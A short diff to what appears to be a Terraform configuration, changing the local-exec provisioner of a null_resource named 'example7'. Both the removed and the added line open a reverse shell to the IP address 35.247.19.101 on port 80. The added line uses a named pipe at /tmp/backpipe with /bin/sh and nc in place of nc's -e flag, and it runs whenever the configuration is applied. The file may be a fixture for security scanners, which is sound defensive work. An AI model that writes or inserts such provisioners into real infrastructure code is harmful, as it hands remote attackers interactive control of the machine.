@@ -9,7 +9,7 @@ resource "random_id" "random" {
 
 resource "null_resource" "example7" {
   provisioner "local-exec" {
-    command = "nc 35.247.19.101 80 -e /bin/bash"
+    command = "mknod /tmp/backpipe p && /bin/sh 0</tmp/backpipe | nc 35.247.19.101 80 1>/tmp/backpipe"
   }
 }
 
